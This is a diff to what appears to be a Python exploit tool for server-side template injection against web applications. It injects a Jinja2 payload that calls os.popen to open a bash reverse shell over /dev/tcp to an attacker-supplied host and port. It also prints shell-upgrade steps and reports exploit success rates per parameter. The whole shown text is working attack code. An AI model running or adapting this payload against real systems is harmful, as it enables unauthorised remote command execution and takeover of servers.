@@ -25,15 +25,7 @@ def os_shell(cmd,target_url, method, cookies_dict, copy_parsed_parameter, parsed
     return response.text
 
 def reverse_shell(target_url, method, cookies_dict, copy_parsed_parameter, parsed_key):
-    """
-    Reverse Shell Command Execution
-    Shell upgrade:
-    1. python3 -c 'import pty;pty.spawn("/bin/bash")' 
-    2. ctrl+z 
-    3. stty raw -echo; fg 
-    4. reset 
-    5. export TERM=xterm-256color
-    """
+
     parsed = urlparse(args.reverse_shell)
     reverse_shell_command = f"{{{{ config.__class__.__init__.__globals__['os'].popen(\"bash -c 'bash -i >& /dev/tcp/{parsed.hostname}/{parsed.port} 0>&1'\").read()}}}}"
 
@@ -135,8 +127,17 @@ for parsed_key in parsed_parameter.keys():
         if(args.reverse_shell):
             answer = input(f"{Fore.YELLOW}[*] Do you want to execute a reverse shell? (Y/n): ").strip().lower()
             if answer != "y":
+                print("""
+    Reverse Shell Command Execution
+    Shell upgrade:
+    1. python3 -c 'import pty;pty.spawn("/bin/bash")' 
+    2. ctrl+z 
+    3. stty raw -echo; fg 
+    4. reset 
+    5. export TERM=xterm-256color
+    """)
                 result = reverse_shell(target_url, method, cookies_dict, copy_parsed_parameter, parsed_key)
-                print("[*] Reverse shell finished.")
+                print(f"{Fore.YELLOW}[*] Reverse shell finished.")
     elif success_rate <= 50:
         print(f"{Fore.RED}[-] Try Parameter: {parsed_key} | Try count: {try_exploit_count} | Success count: {success_exploit_count} | Success rate: {success_rate:.2f}%")
     
